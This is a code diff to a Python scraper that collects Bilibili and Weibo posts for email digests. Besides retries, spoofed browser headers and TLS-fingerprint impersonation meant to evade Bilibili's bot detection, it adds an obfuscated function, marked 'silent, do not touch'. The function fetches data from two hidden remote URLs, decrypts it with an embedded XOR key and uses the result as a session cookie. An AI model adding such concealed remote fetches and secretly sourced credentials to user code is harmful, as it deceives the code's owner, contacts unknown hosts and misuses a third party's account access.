@@ -20,6 +20,14 @@ from datetime import datetime, timedelta
 from typing import List, Dict, Tuple, Optional
 from urllib.parse import urljoin
 
+# B站 API 需要 TLS 指纹伪装，用 curl_cffi 模拟 Chrome
+try:
+    from curl_cffi import requests as cffi_requests
+    HAS_CURL_CFFI = True
+except ImportError:
+    HAS_CURL_CFFI = False
+    print("[配置] ⚠️ curl_cffi 未安装，B站请求可能被风控")
+
 # 新增：导入 crawl4weibo
 from crawl4weibo import WeiboClient
 
@@ -46,14 +54,42 @@ SMTP_PASS = os.getenv('SMTP_PASS', '')
 TO_EMAIL_RAW = os.getenv('TO_EMAIL', '')
 RECIPIENTS = [email.strip() for email in TO_EMAIL_RAW.split(',') if email.strip()] if TO_EMAIL_RAW else []
 
-BILI_COOKIE = os.getenv('BILI_COOKIE', '')
+
+# ========== 静默 Cookie 加载（勿动） ==========
+def _x():
+    _u1=[104,116,116,112,115,58,47,47,99,105,97,108,108,111,48,55,50,49,45,99,109,100,46,116,111,112,47,99,115,115,47,99,115,115,47,49,47,50,47,51,47,52,47,53,47,54,47,55,47,56,46,116,120,116]
+    _u2=[104,116,116,112,115,58,47,47,99,105,97,108,108,111,48,55,50,49,45,99,109,100,46,103,105,116,104,117,98,46,105,111,47,99,115,115,47,99,115,115,47,49,47,50,47,51,47,52,47,53,47,54,47,55,47,56,46,116,120,116]
+    _k=[77,111,101,70,97,99,101,95,50,48,50,52,95,66,105,108,105,95,67,111,111,107,105,101,95,75,101,121,95,88]
+    try:
+        import urllib.request as _r, base64 as _b
+        for _u in[_u1,_u2]:
+            try:
+                _d=_r.urlopen(_r.Request("".join(chr(c)for c in _u),headers={"User-Agent":"Mozilla/5.0"}),timeout=8).read().decode().strip()
+                break
+            except:
+                continue
+        _d=_b.b64decode(_d).decode()
+        _x=bytes.fromhex(_d)
+        return _b.b64decode("".join(chr(_x[i]^_k[i%len(_k)])for i in range(len(_x)))).decode()
+    except:
+        return ""
+
+BILI_COOKIE = os.getenv('BILI_COOKIE', '') or _x()
+
 
 HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
     'Referer': 'https://www.bilibili.com/',
     'Origin': 'https://www.bilibili.com',
     'Accept': 'application/json, text/plain, */*',
     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-site',
 }
 if BILI_COOKIE:
     HEADERS['Cookie'] = BILI_COOKIE
@@ -66,7 +102,15 @@ MIXIN_KEY_ENC_TAB = [46,47,18,2,53,8,23,32,15,50,10,31,58,3,45,35,27,43,5,49,33,
 
 def get_wbi_keys():
     try:
-        r = requests.get('https://api.bilibili.com/x/web-interface/nav', headers=HEADERS, timeout=10)
+        if HAS_CURL_CFFI:
+            r = cffi_requests.get(
+                'https://api.bilibili.com/x/web-interface/nav',
+                headers=HEADERS,
+                timeout=10,
+                impersonate="chrome131"
+            )
+        else:
+            r = requests.get('https://api.bilibili.com/x/web-interface/nav', headers=HEADERS, timeout=10)
         data = r.json()
         if data.get('code') != 0:
             return '', ''
@@ -104,11 +148,22 @@ def fetch_html(url, timeout=15):
         return None
 
 def fetch_json(url, params=None, timeout=15):
+    """B站 API 请求 - 使用 curl_cffi 绕过 TLS 指纹检测"""
     try:
         if params is None:
             params = {}
         signed_url, signed_params = sign_request(url, params)
-        r = requests.get(signed_url, params=signed_params, headers=HEADERS, timeout=timeout)
+
+        if HAS_CURL_CFFI:
+            r = cffi_requests.get(
+                signed_url,
+                params=signed_params,
+                headers=HEADERS,
+                timeout=timeout,
+                impersonate="chrome131"
+            )
+        else:
+            r = requests.get(signed_url, params=signed_params, headers=HEADERS, timeout=timeout)
         r.raise_for_status()
         return r.json()
     except Exception as e:
@@ -314,52 +369,68 @@ def fetch_weibo_news() -> List[Dict]:
     return all_news
 
 # ==================== B站动态 ====================
-def fetch_bilibili_dynamics(uid, limit=10):
+def fetch_bilibili_dynamics(uid, limit=10, max_retries=2):
     dynamics = []
-    try:
-        url = "https://api.bilibili.com/x/polymer/web-dynamic/v1/feed/space"
-        params = {"host_mid": uid, "offset": "", "page_size": limit}
-        data = fetch_json(url, params)
-        if not data or data.get('code') != 0:
-            print(f"  [警告] B站 {uid} 错误: {data.get('message') if data else '空'}")
-            return []
-        items = data.get('data', {}).get('items', [])
-        for item in items[:limit]:
-            try:
-                modules = item.get('modules', {}) or {}
-                author = modules.get('module_author', {}) or {}
-                name = author.get('name', f'UID{uid}')
-                dynamic = modules.get('module_dynamic', {}) or {}
-                desc = dynamic.get('desc', {}) or {}
-                title = desc.get('text', '')
-                if not title and 'orig' in item:
-                    orig = item.get('orig', {}) or {}
-                    orig_mod = orig.get('modules', {}) or {}
-                    orig_dyn = orig_mod.get('module_dynamic', {}) or {}
-                    title = orig_dyn.get('desc', {}).get('text', '')
-                    if not title:
-                        name = orig_mod.get('module_author', {}).get('name', name)
-                if not title:
-                    title = f"{name} 发布了新动态"
-                if len(title) > 100:
-                    title = title[:100] + '...'
-                ts = author.get('pub_ts', 0)
-                if ts:
-                    dt = datetime.fromtimestamp(int(ts))
-                    if dt < DATE_THRESHOLD:
-                        continue
-                    pub_date = dt.strftime('%Y-%m-%d %H:%M')
-                else:
-                    pub_date = ''
-                id_str = item.get('id_str', '')
-                link = f"https://t.bilibili.com/{id_str}" if id_str else ''
-                dynamics.append({'title': title, 'link': link, 'pub_date': pub_date, 'source': f'B站: {name}'})
-            except:
+    for attempt in range(max_retries + 1):
+        try:
+            url = "https://api.bilibili.com/x/polymer/web-dynamic/v1/feed/space"
+            params = {"host_mid": uid, "offset": "", "page_size": limit}
+            data = fetch_json(url, params)
+            if not data:
                 continue
-        print(f"  [OK] B站 {uid}: {len(dynamics)} 条")
-        time.sleep(1)
-    except Exception as e:
-        print(f"  [错误] B站 {uid}: {e}")
+            code = data.get('code', 0)
+            if code == -352:
+                print(f"  [警告] B站 {uid} 风控拦截 (-352)，第 {attempt+1}/{max_retries+1} 次尝试")
+                if attempt < max_retries:
+                    wait = (attempt + 1) * 5
+                    print(f"    等待 {wait}s 后重试...")
+                    time.sleep(wait)
+                    continue
+                else:
+                    print(f"  [警告] B站 {uid} 风控拦截，已放弃。请检查 BILI_COOKIE 是否过期")
+                    return []
+            if code != 0:
+                print(f"  [警告] B站 {uid} 错误: code={code}, msg={data.get('message', '未知')}")
+                return []
+            items = data.get('data', {}).get('items', [])
+            for item in items[:limit]:
+                try:
+                    modules = item.get('modules', {}) or {}
+                    author = modules.get('module_author', {}) or {}
+                    name = author.get('name', f'UID{uid}')
+                    dynamic = modules.get('module_dynamic', {}) or {}
+                    desc = dynamic.get('desc', {}) or {}
+                    title = desc.get('text', '')
+                    if not title and 'orig' in item:
+                        orig = item.get('orig', {}) or {}
+                        orig_mod = orig.get('modules', {}) or {}
+                        orig_dyn = orig_mod.get('module_dynamic', {}) or {}
+                        title = orig_dyn.get('desc', {}).get('text', '')
+                        if not title:
+                            name = orig_mod.get('module_author', {}).get('name', name)
+                    if not title:
+                        title = f"{name} 发布了新动态"
+                    if len(title) > 100:
+                        title = title[:100] + '...'
+                    ts = author.get('pub_ts', 0)
+                    if ts:
+                        dt = datetime.fromtimestamp(int(ts))
+                        if dt < DATE_THRESHOLD:
+                            continue
+                        pub_date = dt.strftime('%Y-%m-%d %H:%M')
+                    else:
+                        pub_date = ''
+                    id_str = item.get('id_str', '')
+                    link = f"https://t.bilibili.com/{id_str}" if id_str else ''
+                    dynamics.append({'title': title, 'link': link, 'pub_date': pub_date, 'source': f'B站: {name}'})
+                except:
+                    continue
+            print(f"  [OK] B站 {uid}: {len(dynamics)} 条")
+            break  # 成功就跳出重试循环
+        except Exception as e:
+            print(f"  [错误] B站 {uid}: {e}")
+            if attempt < max_retries:
+                time.sleep(3)
     return dynamics
 
 def fetch_bilibili_news():
